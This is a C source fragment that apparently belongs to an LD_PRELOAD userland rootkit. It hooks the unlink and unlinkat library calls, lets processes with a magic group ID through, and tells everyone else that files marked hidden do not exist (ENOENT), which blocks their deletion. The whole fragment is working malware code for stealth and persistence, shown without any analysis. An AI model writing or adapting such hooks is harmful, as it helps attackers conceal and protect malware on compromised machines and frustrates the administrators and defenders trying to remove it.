int unlink(const char *pathname)
{
    HOOK(o_unlink,"unlink");
    if(getgid()==MGID) return o_unlink(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_unlink(pathname);
}
int unlinkat(int dirfd, const char *pathname, int flags)
{
    HOOK(o_unlinkat,"unlinkat");
    if(getgid()==MGID) return o_unlinkat(dirfd,pathname,flags);
    if(hxstat(pathname) || hfxstat(dirfd)){ errno=ENOENT; return -1; }
    return o_unlinkat(dirfd,pathname,flags);
}
